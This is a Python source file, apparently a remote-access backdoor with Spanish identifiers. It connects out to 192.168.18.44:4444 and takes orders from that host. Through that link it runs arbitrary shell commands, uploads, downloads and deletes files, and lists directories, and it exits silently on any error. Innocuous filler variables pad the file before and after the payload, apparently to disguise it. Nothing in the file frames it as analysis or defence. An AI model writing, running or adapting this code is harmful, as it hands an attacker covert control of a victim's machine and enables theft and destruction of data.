import socket
import subprocess
import json
import os
import base64
import sys 

hola_mundo= "hola a todos"
ddd= 56

class amigo:
    def __init__(self, direc, porta):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((direc, porta))

    
    def reliable_enviar(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_recibir(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def ejecutar_sistema_comando(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL).decode()

    def cambiar_direct(self, path):
        os.chdir(path)
        return "[+] Cambiando el directorio de trabajo a " + path

    def leer_archivo(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def escribir_archivo(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content.encode()))
            return "[+] Carga exitosa."
    def ejecutar_direct(self):
        current_directory = os.getcwd()
        files = os.listdir(current_directory)
        return "\n".join(files)
    
    def eliminar_archivo(self, path):
        try:
            os.remove(path)
            return "[+] Archivo eliminado exitosamente."
        except Exception:
            return "[-] Error al eliminar el archivo."

    def run(self):
        while True:
            accion = self.reliable_recibir()

            try:
                if accion[0] == "salir":
                    self.connection.close()
                    sys.exit()
                elif accion[0] == "cd" and len(accion) > 1:
                    resultado = self.cambiar_direct(accion[1])
                elif accion[0] == "descargar": 
                    resultado = self.leer_archivo(accion[1])
                elif accion[0] == "enviar":
                    resultado = self.escribir_archivo(accion[1], accion[2])
                elif accion[0] == "dir":
                    resultado = self.ejecutar_direct()
                elif accion[0] == "eliminar":
                    resultado = self.eliminar_archivo(accion[1])
                else:
                    resultado = self.ejecutar_sistema_comando(accion)
            except Exception:
                resultado = "[-] Error durante la ejecución del comando."
            
            self.reliable_enviar(resultado)

try:
    amiguito = amigo("192.168.18.44", 4444)
    amiguito.run()
except Exception:
    sys.exit() 
 
xd=123344
ddd= "44445"
ffff="hola"
mundo = "hola mundo"

variable10 = (1, 2, 3)
variable11 = "Python"
variable12 = 42
variable13 = [4, 5, 6]
variable14 = 2.71828
variable15 = "Hola, mundo!"
variable16 = ["a", "b", "c"]
variable17 = {"nombre": "Juan", "edad": 25}
variable18 = 7
variable19 = 3.14159
variable20 = [7, 8, 9]
variable21 = True
variable22 = "Adiós"

